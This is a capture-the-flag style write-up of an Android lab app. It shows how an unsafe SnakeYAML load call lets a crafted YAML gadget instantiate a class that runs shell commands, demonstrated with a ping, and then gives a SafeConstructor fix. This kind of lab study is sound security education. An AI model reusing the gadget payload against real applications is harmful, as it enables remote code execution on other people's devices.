---
title: "[Android] MHL - config-editor"
description: "MHL - config-editor write-up"
pubDate: "2025-07-17"
---

<div style="display: flex; flex-wrap: wrap; align-items: flex-start;">
  <div style="flex: 1 1 300px; background-color: rgba(70, 130, 180, 0.1); color: #fff; margin: 1em 0; line-height: 1.4; font-size: 1rem; border-radius: 4px; overflow: hidden;">
    <div style="background-color: #6CA6D9; color: #000; padding: 0.5rem 1rem; border-top-right-radius: 4px; font-weight: bold;">
      🔎 Note
    </div>
    <div style="padding: 0.5rem 1rem; border-bottom: 1px solid rgba(108, 166, 217, 0.2);">
      <strong>Challenge: </strong> <a href="https://www.mobilehackinglab.com/course/lab-config-editor-rce" style="color: #4682B4; text-decoration: none;">Config Editor</a>
    </div>
    <div style="padding: 0.5rem 1rem; border-bottom: 1px solid rgba(108, 166, 217, 0.2);">
      <strong>Device: </strong> <a href="https://github.com/remote-android/redroid-doc" style="color: #4682B4; text-decoration: none;">redroid/redroid:13.0.0-latest</a>
    </div>
    <div style="padding: 0.5rem 1rem;">
      <strong>Tools: </strong> adb, frida, jadx, rizin.
    </div>
  </div>
</div>

---
## Overview

After installing the apk, let's unzip it to view its structure:

```bash
❯ mkdir decompiled
❯ unzip com.mobilehackinglab.configeditor.apk -d decompiled/
❯ ls decompiled/
AndroidManifest.xml  classes2.dex  DebugProbesKt.bin  res
assets               classes3.dex  kotlin             resources.arsc
classes.dex          classes4.dex  META-INF 
```

With this directory in our workspace, we'll open the application in our device:

<div style="display: flex; justify-content: center; margin: 20px auto; max-width: 800px; align-items: center;">
  <div style="flex: 1; text-align: justify; padding-right: 5%;">
    <p style="margin-left: 15px; line-height: 1.5;">The application has two buttons, the first one (<strong>Load</strong>) lets us upload a file, if the latter contains text, it will be printed on the screen; on the other hand, the second button (<strong>Save</strong>) lets us to download a <code>YAML</code> file called "example" by default, which contains the input file's content.</p>
    <p style="margin-left: 15px; line-height: 1.5;">Apparently, the application is parsing the input file content, based on the downloaded file, probably a <code>YAML</code> file is required, let's recursively grep our <code>decompiled</code> folder looking for the "yaml" pattern.</p>
  </div>
  
  <div style="flex: 0 0 180px; margin-right: 25px;">
    <img src="/images/Write-ups/config-editor/app-init.png" style="width: 100%; height: auto; max-width: 180px; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"/>
    <p style="text-align: center; font-style: italic; margin-top: 8px; color: #555; font-size: 12px;">
      Figure 1: App initialization
    </p>
  </div>
</div>

```bash
❯ cd decompiled/
❯ grep -riE "yaml|yml"
grep: classes4.dex: binary file matches
grep: classes.dex: binary file matches
assets/example.yml: #Comment: This is a supermarket list using YAML
grep: res/drawable-ldrtl-xhdpi-v17/abc_spinner_mtrl_am_alpha.9.png: binary file matches

❯ cat assets/example.yml
#Comment: This is a supermarket list using YAML
#Note that - character represents the list
---
food:
  - vegetables: tomatoes #first list item
  - fruits: #second list item
      citrics: oranges
      tropical: bananas
      nuts: peanuts
      sweets: raisins

```

We found some files, the most relevant is `example.yml`, which contains a supermarket list in `YAML`, let's upload the latter to our application:

```bash
❯ adb -s localhost:5555 push assets/example.yml sdcard/Download/
```

<div style="display: flex; justify-content: center; margin: 20px auto; max-width: 800px; align-items: center;">
  <div style="flex: 0 0 180px; margin-right: 25px;">
    <img src="/images/Write-ups/config-editor/app-upload-yaml.png" style="width: 100%; height: auto; max-width: 180px; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"/>
    <p style="text-align: center; font-style: italic; margin-top: 8px; color: #555; font-size: 12px;">
      Figure 2: Uploading a <code>YAML</code>
    </p>
  </div>
</div>

The application is parsing the example file. We'll make sure of this viewing the application code using `jadx`:

```
❯ jadx-gui com.mobilehackinglab.configeditor.apk&
```

<div align="center" style="margin: 20px 0;">
  <img src="/images/Write-ups/config-editor/jadx-main.png" style="max-width: 100%; height: auto; display: block; margin: 0 auto; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"/>
  <p style="text-align: center; font-style: italic; margin-top: 8px; color: #555;">
    Figure 3: <code>MainActivity</code> analysis in jadx
  </p>
</div>

The Android Manifest doesn't have anything relevant. However, the `MainActivity` includes interesting logic; its core functionality lies in parsing `YAML` files using a third-party library called "SnakeYAML" (`import org.yaml.snakeyaml.Yaml`). The challenge involves an **RCE** vulnerability in a third-party library; therefore, we've identified our attack vector.

---
## SnakeYAML Vulnerability

Doing a quick search we can find a **SnakeYAML** CVE that involves remote code execution as long as the application uses an insecure constructor to deserialize the input file's content:

<div align="center" style="margin: 20px 0;">
  <img src="/images/Write-ups/config-editor/snakeyaml-cve.png" style="max-width: 100%; height: auto; display: block; margin: 0 auto; border: 1px solid #808080; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"/>
  <p style="text-align: center; font-style: italic; margin-top: 8px; color: #555;">
    Figure 4: <code>SnakeYAML</code> remote code execution
  </p>
</div>

#### Breaks down the vulnerability:

Our application's code contains the vulnerability in the following line: `Object deserializedData = yaml.load(inputStream);`. First, note that `load` is a generic method which converts the input into a Java object and returns it inferred by the type of the target variable:

```java
public <T> T load(InputStream inputStream) {  
    return (T) loadFromReader(new StreamReader(new UnicodeReader(inputStream)), Object.class);  
}
```

In our case, `deserializedData` has the `Object` type, therefore, `load` will return an object of any type. But what does it mean for us? Well, we need to know something: **SnakeYAML** has a special feature that lets us create Java objects in the `YAML` file that will be parsed, as long as we use a particular syntax. 

Imagine the application has a class called `Greeting`, whose constructor receives a name and prints a greeting:

```java
package com.mytest.test

public class Greeting {
    public Greeting(String name) {
        System.out.println("Hello " + name + "!")
    }
}
```

By exploiting **SnakeYAML**'s vulnerability, we can instantiate this class with its parameter and, thus, execute the constructor's code. To do this, we need the following `YAML` gadget: 

```yaml
!!com.mytest.test.Greeting ["Camilo"]
```

**SnakeYAML**'s `!!` syntax allows arbitrary object instantiation (like `com.mytest.test.Greeting` in this case), where `[...]` defines the constructor parameters (here, a name). In short, with this payload, `deserializedData` becomes `new Greeting("Camilo")`. Now, let's exploit this on a real class in the application.

---
## Exploitation (PoC)

Pressing **Ctrl + N** in jadx, we can filter classes based on their names. In this case, we can type a regular expression that contains the name of relevant classes if they exist: 

<div align="center" style="margin: 20px 0;">
  <img src="/images/Write-ups/config-editor/jadx-classes.png" style="max-width: 100%; height: auto; display: block; margin: 0 auto; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"/>
  <p style="text-align: center; font-style: italic; margin-top: 8px; color: #555;">
    Figure 5: Looking for interesting classes
  </p>
</div>

There is an interesting class in `com.mobilehackinglab.configeditor` package called `LegacyCommandUtil`:

```java
package com.mobilehackinglab.configeditor;  
  
// ...

public final class LegacyCommandUtil {  
    public LegacyCommandUtil(String command) {  
        Intrinsics.checkNotNullParameter(command, "command");  
        Runtime.getRuntime().exec(command);  
    }  
}
```

This is what we're looking for, `LegacyCommandUtil` lets us execute a command on the target device. As I explained, we can approach application's classes to build the `YAML` gadget, so, let's build a gadget capable of executing a simple command:

```yaml
!!com.mobilehackinglab.configeditor.LegacyCommandUtil ["ping -c 1 172.0.0.1"]
```

Before loading the payload in the application, I'll listen to **ICMP** traces on my host device using tcpdump:

```bash
❯ tcpdump -i docker0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

<div style="display: flex; justify-content: center; margin: 20px auto; max-width: 800px; align-items: center;">
  <div style="flex: 0 0 180px; margin-right: 25px;">
    <img src="/images/Write-ups/config-editor/app-load-payload.png" style="width: 100%; height: auto; max-width: 180px; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"/>
    <p style="text-align: center; font-style: italic; margin-top: 8px; color: #555; font-size: 12px;">
      Figure 6: Loading the payload
    </p>
  </div>
</div>

```bash
# We received the trace!
15:32:03.711959 IP Android.local > terreneitor: ICMP echo request, id 1, seq 1, length 64
15:32:03.712095 IP terreneitor > Android.local: ICMP echo reply, id 1, seq 1, length 64
```

This little example was useful to demonstrate the **RCE** vulnerability that involves **SnakeYAML**'s CVE. Now then, how can we mitigate this vulnerability?

#### Mitigation: 

The solution is simple: avoid using the default constructor of `YAML`, which allows arbitrary object instantiation through tags like `!!class`. Instead, use `SafeConstructor` to restrict deserialization to simple types such as maps, lists, strings, numbers, and booleans:

```java
Yaml yaml = new Yaml(new SafeConstructor()); 
Object data = yaml.load(input);
```

By doing this, any attempt to deserialize custom Java classes from `YAML` (e.g., `!!com.example.MyClass`) will fail safely. Since **SnakeYAML 2.0**, the library enforces stricter controls by default. Unsafe constructors must now be explicitly enabled; therefore, arbitrary object creation is disabled by default.

That's all, thanks for reading <3.
